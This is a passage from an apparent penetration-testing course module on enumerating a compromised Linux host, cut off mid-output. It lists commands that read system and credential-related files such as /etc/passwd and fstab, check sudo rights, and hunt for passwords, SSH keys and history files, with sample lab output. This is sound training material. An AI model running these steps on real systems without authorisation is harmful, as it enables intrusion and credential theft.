<p>First, we&#39;ll answer the fundamental question: What operating system are we dealing with? If we landed on a CentOS host or Red Hat Enterprise Linux host, our enumeration would likely be slightly different than if we landed on a Debian-based host such as Ubuntu. If we land on a host such as FreeBSD, Solaris, or something more obscure such as the HP proprietary OS HP-UX or the IBM OS AIX, the commands we would work with will likely be different. Though the commands may be different, and we may even need to look up a command reference in some instances, the principles are the same. For our purposes, we&#39;ll begin with an Ubuntu target to cover general tactics and techniques. Once we learn the basics and combine them with a new way of thinking and the stages of the Penetration Testing Process, it shouldn&#39;t matter what type of Linux system we land on because we&#39;ll have a thorough and repeatable process.</p>
<p>There are many cheat sheets out there to help with enumerating Linux systems and some bits of information we are interested in will have two or more ways to obtain it. In this module we&#39;ll cover one methodology that can likely be used for the majority of Linux systems that we encounter in the wild. That being said, make sure you understand what the commands are doing and how to tweak them or find the information you need a different way if a particular command doesn&#39;t work. Challenge yourself during this module to try things various ways to practice your methodology and what works best for you. Anyone can re-type commands from a cheat sheet but a deep understanding of what you are looking for and how to obtain it will help us be successful in any environment.</p>
<p>Typically we&#39;ll want to run a few basic commands to orient ourselves:</p>
<ul>
<li><code>whoami</code> - what user are we running as</li>
<li><code>id</code> - what groups does our user belong to?</li>
<li><code>hostname</code> - what is the server named. can we gather anything from the naming convention?</li>
<li><code>ifconfig</code> or <code>ip -a</code> - what subnet did we land in, does the host have additional NICs in other subnets?</li>
<li><code>sudo -l</code> - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like <code>sudo su</code> and drop right into a root shell.</li>
</ul>
<p>Including screenshots of the above information can be helpful in a client report to provide evidence of a successful Remote Code Execution (RCE) and to clearly identify the affected system. Now let&#39;s get into our more detailed, step-by-step, enumeration.</p>
<p>We&#39;ll start out by checking out what operating system and version we are dealing with.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/os-release

NAME=<span class="hljs-string">"Ubuntu"</span>
VERSION=<span class="hljs-string">"20.04.4 LTS (Focal Fossa)"</span>
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=<span class="hljs-string">"Ubuntu 20.04.4 LTS"</span>
VERSION_ID=<span class="hljs-string">"20.04"</span>
HOME_URL=<span class="hljs-string">"https://www.ubuntu.com/"</span>
SUPPORT_URL=<span class="hljs-string">"https://help.ubuntu.com/"</span>
BUG_REPORT_URL=<span class="hljs-string">"https://bugs.launchpad.net/ubuntu/"</span>
PRIVACY_POLICY_URL=<span class="hljs-string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span>
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
</code></pre>
<p>We can see that the target is running <a href="https://releases.ubuntu.com/20.04/">Ubuntu 20.04.4 LTS (&quot;Focal Fossa&quot;)</a>. For whatever version we encounter its important to see if we&#39;re dealing with something out-of-date or maintained. Ubuntu publishes its <a href="https://ubuntu.com/about/release-cycle">release cycle</a> and from this we can see that &quot;Focal Fossa&quot; does not reach end of life until April 2030. From this information we can assume that we will not encounter a well-known Kernel vulnerability because the customer has been keeping their internet-facing asset patched but we&#39;ll still look regardless.</p>
<p>Next we&#39;ll want to check out our current user&#39;s PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type, i.e., <code>id</code> which on this system is located at <code>/usr/bin/id</code>. As we&#39;ll see later in this module, if the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges. For now we&#39;ll note it down and add it to our notetaking tool of choice.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ echo $PATH

<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/sbin:/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/games:/</span>snap/bin
</code></pre>
<p>We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We&#39;ll note this down and move on.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ env

SHELL=/bin/bash
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=en_US.UTF-8

&lt;SNIP&gt;
</code></pre>
<p>Next let&#39;s note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we&#39;ll get to take advantage of later on in the module) which has some known public exploit PoC. We can do this a few ways, another way would be <code>cat /proc/version</code> but we&#39;ll use the <code>uname -a</code> command.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ uname -<span class="hljs-selector-tag">a</span>

Linux nixlpe02 <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">122</span>-generic <span class="hljs-number">#138</span>-Ubuntu SMP Wed Jun <span class="hljs-number">22</span> <span class="hljs-number">15</span>:<span class="hljs-number">00</span>:<span class="hljs-number">31</span> UTC <span class="hljs-number">2022</span> x86_64 x86_64 x86_64 GNU/Linux
</code></pre>
<p>We can next gather some additional information about the host itself such as the CPU type/version:</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session"><span class="hljs-attribute">root@htb[/htb]$ lscpu 

Architecture</span>:                    x86_64
<span class="hljs-attribute">CPU op-mode(s)</span>:                  32-bit, 64-bit
<span class="hljs-attribute">Byte Order</span>:                      Little Endian
<span class="hljs-attribute">Address sizes</span>:                   43 bits physical, 48 bits virtual
<span class="hljs-attribute">CPU(s)</span>:                          2
<span class="hljs-attribute">On-line CPU(s) list</span>:             0,1
<span class="hljs-attribute">Thread(s) per core</span>:              1
<span class="hljs-attribute">Core(s) per socket</span>:              2
<span class="hljs-attribute">Socket(s)</span>:                       1
<span class="hljs-attribute">NUMA node(s)</span>:                    1
<span class="hljs-attribute">Vendor ID</span>:                       AuthenticAMD
<span class="hljs-attribute">CPU family</span>:                      23
<span class="hljs-attribute">Model</span>:                           49
<span class="hljs-attribute">Model name</span>:                      AMD EPYC 7302P 16-Core Processor
<span class="hljs-attribute">Stepping</span>:                        0
<span class="hljs-attribute">CPU MHz</span>:                         2994.375
<span class="hljs-attribute">BogoMIPS</span>:                        5988.75
<span class="hljs-attribute">Hypervisor vendor</span>:               VMware

&lt;SNIP&gt;
</code></pre>
<p>What login shells exist on the server? Note these down and highlight that both Tmux and Screen are availble to us.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat <span class="hljs-meta-keyword">/etc/</span>shells

<span class="hljs-meta"># /etc/shells: valid login shells</span>
<span class="hljs-meta-keyword">/bin/</span>sh
<span class="hljs-meta-keyword">/bin/</span>bash
<span class="hljs-meta-keyword">/usr/</span>bin/bash
<span class="hljs-meta-keyword">/bin/</span>rbash
<span class="hljs-meta-keyword">/usr/</span>bin/rbash
<span class="hljs-meta-keyword">/bin/</span>dash
<span class="hljs-meta-keyword">/usr/</span>bin/dash
<span class="hljs-meta-keyword">/usr/</span>bin/tmux
<span class="hljs-meta-keyword">/usr/</span>bin/screen
</code></pre>
<p>We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Exec\_Shield">Exec Shield</a></li>
<li><a href="https://linux.die.net/man/8/iptables">iptables</a></li>
<li><a href="https://apparmor.net/">AppArmor</a></li>
<li><a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a></li>
<li><a href="https://github.com/fail2ban/fail2ban">Fail2ban</a></li>
<li><a href="https://www.snort.org/faq/what-is-snort">Snort</a></li>
<li><a href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a></li>
</ul>
<p>Often we will not have the privileges to enumerate the configurations of these protections but knowing what, if any, are in place, can help us not to waste time on certain tasks.</p>
<p>Next we can take a look at the drives and any shares on the system. First, we can use the <code>lsblk</code> command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0   <span class="hljs-number"> 0 </span>  55M <span class="hljs-number"> 1 </span>loop /snap/core18/1705
loop1                       7:1   <span class="hljs-number"> 0 </span>  69M <span class="hljs-number"> 1 </span>loop /snap/lxd/14804
loop2                       7:2   <span class="hljs-number"> 0 </span>  47M <span class="hljs-number"> 1 </span>loop /snap/snapd/16292
loop3                       7:3   <span class="hljs-number"> 0 </span> 103M <span class="hljs-number"> 1 </span>loop /snap/lxd/23339
loop4                       7:4   <span class="hljs-number"> 0 </span>  62M <span class="hljs-number"> 1 </span>loop /snap/core20/1587
loop5                       7:5   <span class="hljs-number"> 0 </span>55.6M <span class="hljs-number"> 1 </span>loop /snap/core18/2538
sda                         8:0   <span class="hljs-number"> 0 </span>  20G <span class="hljs-number"> 0 </span>disk 
├─sda1                      8:1   <span class="hljs-number"> 0 </span>   1M <span class="hljs-number"> 0 </span>part 
├─sda2                      8:2   <span class="hljs-number"> 0 </span>   1G <span class="hljs-number"> 0 </span>part /boot
└─sda3                      8:3   <span class="hljs-number"> 0 </span>  19G <span class="hljs-number"> 0 </span>part 
  └─ubuntu--vg-ubuntu--lv 253:0   <span class="hljs-number"> 0 </span>  18G <span class="hljs-number"> 0 </span>lvm  /
sr0                        11:0   <span class="hljs-number"> 1 </span> 908M <span class="hljs-number"> 0 </span>rom
</code></pre>
<p>The command <code>lpstat</code> can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information?</p>
<p>We should also checked for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in <code>fstab</code> for mounted drives by grepping for common words such as password, username, credential, etc in <code>/etc/fstab</code>?</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/fstab

<span class="hljs-meta"># /etc/fstab: static file system information.</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Use 'blkid' to print the universally unique identifier for a</span>
<span class="hljs-meta"># device; this may be used with UUID= as a more robust way to name devices</span>
<span class="hljs-meta"># that works even if disks are added and removed. See fstab(5).</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span>
<span class="hljs-meta"># / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation</span>
/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults <span class="hljs-number">0</span> <span class="hljs-number">0</span>
<span class="hljs-meta"># /boot was on /dev/sda2 during curtin installation</span>
/dev/disk/by-uuid/<span class="hljs-number">20</span>b1770d-a233<span class="hljs-number">-4780</span><span class="hljs-number">-900e-7</span>c99bc974346 /boot ext4 defaults <span class="hljs-number">0</span> <span class="hljs-number">0</span>
</code></pre>
<p>Check out the routing table by typing <code>route</code> or <code>netstat -rn</code>. Here we can see what other networks are available via which interface.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
<span class="hljs-section">default</span>         _gateway        <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>         UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> ens192
<span class="hljs-number">10.129</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>      <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>     U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> ens192
</code></pre>
<p>In a domain environment we&#39;ll definitely want to check <code>/etc/resolv.conf</code> if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.</p>
<p>We&#39;ll also want to check the arp table to see what other hosts the target has been communicating with.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ arp -<span class="hljs-keyword">a</span>

<span class="hljs-title">_gateway</span> (<span class="hljs-number">10.129</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>) <span class="hljs-keyword">at</span> <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:b9:fc [ether] <span class="hljs-keyword">on</span> <span class="hljs-title">ens192</span>
</code></pre>
<p>The environment enumeration also includes knowledge about the users that exist on the target system. This is because individual users are often configured during the installation of applications and services to limit the service&#39;s privileges. The reason for this is to maintain the security of the system itself. Because if a service is running with the highest privileges (<code>root</code>) and this is brought under control by an attacker, the attacker automatically has the highest rights over the entire system. All users on the system are stored in the <code>/etc/passwd</code> file. The format gives us some information, such as:</p>
<ol>
<li>Username</li>
<li>Password</li>
<li>User ID (UID)</li>
<li>Group ID (GID)</li>
<li>User ID info</li>
<li>Home directory</li>
<li>Shell</li>
</ol>
<p><strong>Existing Users</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>etc/passwd
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-string">sys:</span><span class="hljs-regexp">/dev:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sync:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">sync:</span><span class="hljs-regexp">/bin:/</span>bin/sync
<span class="hljs-string">games:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-string">man:</span><span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-string">lp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-string">mail:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">mail:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-string">news:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">uucp:</span><span class="hljs-string">x:</span><span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-string">uucp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/uucp:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">proxy:</span><span class="hljs-string">x:</span><span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-string">proxy:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
www-<span class="hljs-string">data:</span><span class="hljs-string">x:</span><span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-string">data:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">www:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">backup:</span><span class="hljs-string">x:</span><span class="hljs-number">34</span>:<span class="hljs-number">34</span>:<span class="hljs-string">backup:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">backups:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">list:</span><span class="hljs-string">x:</span><span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List <span class="hljs-string">Manager:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">list:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">irc:</span><span class="hljs-string">x:</span><span class="hljs-number">39</span>:<span class="hljs-number">39</span>:<span class="hljs-string">ircd:</span><span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/ircd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">tcpdump:</span><span class="hljs-string">x:</span><span class="hljs-number">108</span>:<span class="hljs-number">115</span>::<span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mrb3n:</span><span class="hljs-string">x:</span><span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:<span class="hljs-string">mrb3n:</span><span class="hljs-regexp">/home/</span><span class="hljs-string">mrb3n:</span><span class="hljs-regexp">/bin/</span>bash
<span class="hljs-string">bjones:</span><span class="hljs-string">x:</span><span class="hljs-number">1001</span>:<span class="hljs-number">1001</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">bjones:</span><span class="hljs-regexp">/bin/</span>sh
administrator.<span class="hljs-string">ilfreight:</span><span class="hljs-string">x:</span><span class="hljs-number">1002</span>:<span class="hljs-number">1002</span>::<span class="hljs-regexp">/home/</span>administrator.<span class="hljs-string">ilfreight:</span><span class="hljs-regexp">/bin/</span>sh
<span class="hljs-string">backupsvc:</span><span class="hljs-string">x:</span><span class="hljs-number">1003</span>:<span class="hljs-number">1003</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">backupsvc:</span><span class="hljs-regexp">/bin/</span>sh
cliff.<span class="hljs-string">moore:</span><span class="hljs-string">x:</span><span class="hljs-number">1004</span>:<span class="hljs-number">1004</span>::<span class="hljs-regexp">/home/</span>cliff.<span class="hljs-string">moore:</span><span class="hljs-regexp">/bin/</span>bash
<span class="hljs-string">logger:</span><span class="hljs-string">x:</span><span class="hljs-number">1005</span>:<span class="hljs-number">1005</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">logger:</span><span class="hljs-regexp">/bin/</span>sh
<span class="hljs-string">shared:</span><span class="hljs-string">x:</span><span class="hljs-number">1006</span>:<span class="hljs-number">1006</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">shared:</span><span class="hljs-regexp">/bin/</span>sh
stacey.<span class="hljs-string">jenkins:</span><span class="hljs-string">x:</span><span class="hljs-number">1007</span>:<span class="hljs-number">1007</span>::<span class="hljs-regexp">/home/</span>stacey.<span class="hljs-string">jenkins:</span><span class="hljs-regexp">/bin/</span>bash
htb-<span class="hljs-string">student:</span><span class="hljs-string">x:</span><span class="hljs-number">1008</span>:<span class="hljs-number">1008</span>::<span class="hljs-regexp">/home/</span>htb-<span class="hljs-string">student:</span><span class="hljs-regexp">/bin/</span>bash
&lt;SNIP&gt;
</code></pre>
<p>Occasionally, we will see password hashes directly in the <code>/etc/passwd</code> file. This file is readable by all users, and as with hashes in the <code>/etc/shadow</code> file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span><span class="hljs-comment">@htb[/htb]$ cat /etc/passwd | cut -f1 -d:</span>

<span class="hljs-symbol">root</span>
<span class="hljs-symbol">daemon</span>
<span class="hljs-keyword">bin
</span><span class="hljs-symbol">sys</span>

<span class="hljs-symbol">...SNIP...</span>

<span class="hljs-symbol">mrb3n</span>
<span class="hljs-symbol">lxd</span>
<span class="hljs-keyword">bjones
</span><span class="hljs-symbol">administrator.ilfreight</span>
<span class="hljs-keyword">backupsvc
</span><span class="hljs-symbol">cliff.moore</span>
<span class="hljs-symbol">logger</span>
<span class="hljs-symbol">shared</span>
<span class="hljs-symbol">stacey.jenkins</span>
<span class="hljs-symbol">htb</span>-student
</code></pre>
<p>With Linux, several different hash algorithms can be used to make the passwords unrecognizable. Identifying them from the first hash blocks can help us to use and work with them later if needed. Here is a list of the most used ones:</p>
<table>
<thead>
<tr>
<th><strong>Algorithm</strong></th>
<th><strong>Hash</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Salted MD5</td>
<td><code>$1$</code>...</td>
</tr>
<tr>
<td>SHA-256</td>
<td><code>$5$</code>...</td>
</tr>
<tr>
<td>SHA-512</td>
<td><code>$6$</code>...</td>
</tr>
<tr>
<td>BCrypt</td>
<td><code>$2a$</code>...</td>
</tr>
<tr>
<td>Scrypt</td>
<td><code>$7$</code>...</td>
</tr>
<tr>
<td>Argon2</td>
<td><code>$argon2i$</code>...</td>
</tr>
</tbody>
</table>
<p>We&#39;ll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a <code>shellshock</code> exploit.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ grep "*sh$" /</span>etc/passwd
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
<span class="hljs-string">mrb3n:</span><span class="hljs-string">x:</span><span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:<span class="hljs-string">mrb3n:</span><span class="hljs-regexp">/home/</span><span class="hljs-string">mrb3n:</span><span class="hljs-regexp">/bin/</span>bash
<span class="hljs-string">bjones:</span><span class="hljs-string">x:</span><span class="hljs-number">1001</span>:<span class="hljs-number">1001</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">bjones:</span><span class="hljs-regexp">/bin/</span>sh
administrator.<span class="hljs-string">ilfreight:</span><span class="hljs-string">x:</span><span class="hljs-number">1002</span>:<span class="hljs-number">1002</span>::<span class="hljs-regexp">/home/</span>administrator.<span class="hljs-string">ilfreight:</span><span class="hljs-regexp">/bin/</span>sh
<span class="hljs-string">backupsvc:</span><span class="hljs-string">x:</span><span class="hljs-number">1003</span>:<span class="hljs-number">1003</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">backupsvc:</span><span class="hljs-regexp">/bin/</span>sh
cliff.<span class="hljs-string">moore:</span><span class="hljs-string">x:</span><span class="hljs-number">1004</span>:<span class="hljs-number">1004</span>::<span class="hljs-regexp">/home/</span>cliff.<span class="hljs-string">moore:</span><span class="hljs-regexp">/bin/</span>bash
<span class="hljs-string">logger:</span><span class="hljs-string">x:</span><span class="hljs-number">1005</span>:<span class="hljs-number">1005</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">logger:</span><span class="hljs-regexp">/bin/</span>sh
<span class="hljs-string">shared:</span><span class="hljs-string">x:</span><span class="hljs-number">1006</span>:<span class="hljs-number">1006</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">shared:</span><span class="hljs-regexp">/bin/</span>sh
stacey.<span class="hljs-string">jenkins:</span><span class="hljs-string">x:</span><span class="hljs-number">1007</span>:<span class="hljs-number">1007</span>::<span class="hljs-regexp">/home/</span>stacey.<span class="hljs-string">jenkins:</span><span class="hljs-regexp">/bin/</span>bash
htb-<span class="hljs-string">student:</span><span class="hljs-string">x:</span><span class="hljs-number">1008</span>:<span class="hljs-number">1008</span>::<span class="hljs-regexp">/home/</span>htb-<span class="hljs-string">student:</span><span class="hljs-regexp">/bin/</span>bash
</code></pre>
<p>Each user in Linux systems is assigned to a specific group or groups and thus receives special privileges. For example, if we have a folder named <code>dev</code> only for developers, a user must be assigned to the appropriate group to access that folder. The information about the available groups can be found in the <code>/etc/group</code> file, which shows us both the group name and the assigned user names.</p>
<p><strong>Existing Groups</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>etc/group
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:
<span class="hljs-string">adm:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:syslog,htb-student
<span class="hljs-string">tty:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:syslog
<span class="hljs-string">disk:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:
<span class="hljs-string">uucp:</span><span class="hljs-string">x:</span><span class="hljs-number">10</span>:
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">12</span>:
<span class="hljs-string">proxy:</span><span class="hljs-string">x:</span><span class="hljs-number">13</span>:
<span class="hljs-string">kmem:</span><span class="hljs-string">x:</span><span class="hljs-number">15</span>:
<span class="hljs-string">dialout:</span><span class="hljs-string">x:</span><span class="hljs-number">20</span>:
<span class="hljs-string">fax:</span><span class="hljs-string">x:</span><span class="hljs-number">21</span>:
<span class="hljs-string">voice:</span><span class="hljs-string">x:</span><span class="hljs-number">22</span>:
<span class="hljs-string">cdrom:</span><span class="hljs-string">x:</span><span class="hljs-number">24</span>:htb-student
<span class="hljs-string">floppy:</span><span class="hljs-string">x:</span><span class="hljs-number">25</span>:
<span class="hljs-string">tape:</span><span class="hljs-string">x:</span><span class="hljs-number">26</span>:
<span class="hljs-string">sudo:</span><span class="hljs-string">x:</span><span class="hljs-number">27</span>:mrb3n,htb-student
<span class="hljs-string">audio:</span><span class="hljs-string">x:</span><span class="hljs-number">29</span>:pulse
<span class="hljs-string">dip:</span><span class="hljs-string">x:</span><span class="hljs-number">30</span>:htb-student
www-<span class="hljs-string">data:</span><span class="hljs-string">x:</span><span class="hljs-number">33</span>:
...SNIP...
</code></pre>
<p>The <code>/etc/group</code> file lists all of the groups on the system. We can then use the <a href="https://man7.org/linux/man-pages/man1/getent.1.html">getent</a> command to list members of any interesting groups.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ getent <span class="hljs-keyword">group</span> <span class="hljs-title">sudo</span>

sudo:x:<span class="hljs-number">27</span>:mrb3n
</code></pre>
<p>We can also check out which users have a folder under the <code>/home</code> directory. We&#39;ll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords. We should check to see if files such as the <code>.bash_history</code> file are readable and contain any interesting commands and look for configuration files. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment. Its also important to check for SSH keys for all users, as these could be used to achieve persistence on the system, potentially to escalate privileges, or to assist with pivoting and port forwarding further into the internal network. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.</p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls /home

administrator<span class="hljs-selector-class">.ilfreight</span>  bjones       htb-student  mrb3n   stacey<span class="hljs-selector-class">.jenkins</span>
backupsvc                cliff<span class="hljs-selector-class">.moore</span>  logger       shared
</code></pre>
<p>Finally, we can search for any &quot;low hanging fruit&quot; such as config files, and other files that may contain sensitive information. Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.</p>
<p>If we&#39;ve gathered any passwords we should try them at this time for all users present on the system. Password re-use is common so we might get lucky!</p>
<p>In Linux, there are many different places where such files can be stored, including mounted file systems. A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory. Many file systems, such as ext4, NTFS, and FAT32, can be mounted. Each type of file system has its own benefits and drawbacks. For example, some file systems can only be read by the operating system, while others can be read and written by the user. File systems that can be read and written to by the user are called read/write file systems. Mounting a file system allows the user to access the files and folders stored on that file system. In order to mount a file system, the user must have root privileges. Once a file system is mounted, it can be unmounted by the user with root privileges. We may have access to such file systems and may find sensitive information, documentation, or applications there.</p>
<p><strong>Mounted File Systems</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ df -h

Filesystem      Size  Used Avail Use% Mounted on
